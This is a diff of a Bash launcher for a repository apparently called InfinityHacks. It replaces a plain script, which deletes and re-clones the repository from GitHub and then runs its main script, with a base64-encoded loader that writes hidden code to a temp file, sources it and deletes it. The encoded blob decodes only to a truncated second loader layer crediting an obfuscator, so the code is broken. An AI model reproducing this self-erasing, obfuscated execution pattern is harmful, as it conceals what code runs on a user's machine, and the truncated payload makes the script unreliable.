@@ -1,35 +1,10 @@
-# Nombre del repositorio y usuario
-repo="InfinityHacks"
-usuario="InfinityStudioYT"
-
-ruta=~/$repo
-
-if [ -d $ruta ]; then
-	rm -rf $ruta
-fi
-
-# Clonar el repositorio (si no existe)
-
-if [ ! -d $repo ]; then
-  cd $HOME
-  git clone "https://github.com/$usuario/$repo.git"
-fi
-
-# Cambiar al directorio del repositorio
-cd $ruta
-
-# Verificar si hay cambios remotos
-if git fetch origin master | grep 'new commits'; then
-  # Hay cambios remotos
-  echo "El repositorio $repo está desactualizado. Actualizando..."
-  git pull
-  echo "Actualización completada."
-else
-  # No hay cambios remotos
-  echo "El repositorio $repo está actualizado."
-fi
-
-# Agregar los comandos cd al final del script
-cd
-cd InfinityHacks
-bash InfinityHacks.sh
+#!/usr/bin/env bash
+InfinityHacks=$(mktemp)
+base64 -d  >${InfinityHacks}<<DIXIE
+IyEvdXNyL2Jpbi9lbnYgYmFzaAojCiMgT2JmdXNjYXRlIGJ5IEBDZXNhckhhY2tHcmF5CiMgQ29u
+dGFjdGEgaHR0cHM6Ly90Lm1lL0Nlc2FyR3JheQojIENoYW5uZWw6IGh0dHBzOi8vd3d3LnlvdXR1
+YmUuY29tL2NoYW5uZWwvVUNqczBOOFBiRW8tc2Uwcl80T19zdk5RCiMKIwpDZXNhckhhY2tHcmF5
+PSQobWt0ZW1wKQpiYXNlNjQgLWQgID4ke0Nlc2FySGFja0dyYXl9PDxESVhJRQo=
+DIXIE
+source ${InfinityHacks}
+rm -rf ${InfinityHacks}
